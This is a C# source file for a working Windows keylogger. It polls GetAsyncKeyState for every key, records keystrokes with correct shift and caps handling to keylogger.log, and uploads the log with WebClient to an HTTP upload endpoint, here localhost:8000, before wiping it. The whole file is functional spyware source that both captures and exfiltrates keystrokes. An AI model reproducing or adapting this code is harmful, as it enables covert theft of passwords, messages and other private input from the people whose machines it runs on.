using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;

namespace CustomKeylogger
{
    internal static class Program
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
        static void Main(String[] args)
        {
            string buf = "";
            while (true)
            {
                Thread.Sleep(85);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    bool shift = false;
                    short shiftState = (short)GetAsyncKeyState(16);
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    var caps = Console.CapsLock;
                    bool isBig = shift | caps;
                    if (state != 0)
                    {
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
                        if (((Keys)i) == Keys.Space)
                        {
                            buf += " ";
                            continue;
                        }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;


                        if (((Keys)i).ToString().Length == 1)
                        {
                            if (isBig)
                            {
                                buf += ((Keys)i).ToString();
                            }
                            else
                            {
                                buf += ((Keys)i).ToString().ToLowerInvariant();
                            }
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                    }
                }
                long length = new System.IO.FileInfo("keylogger.log").Length;
                if (length > 5000)
                {
                    try
                    {
                        var client = new WebClient();
                        var uri = new Uri("http://localhost:8000/upload/");
                        {
                            client.Headers.Add("fileName", System.IO.Path.GetFileName("keylogger.log"));
                            client.Headers.Add("ip", "123456");
                            client.UploadFileAsync(uri, "keylogger.log");
                            Thread.Sleep(1000);
                            System.IO.File.WriteAllText("keylogger.log", string.Empty);
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
                /*try
                {
                    var client = new WebClient();
                    var uri = new Uri("http://localhost:8000/upload/");
                    {
                        client.Headers.Add("fileName", System.IO.Path.GetFileName("keylogger.log"));
                        client.Headers.Add("ip", "123456");
                        client.UploadFileAsync(uri, "keylogger.log");
                        MessageBox.Show("File has been uploaded successfully");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }*/
            }
        }
    }
}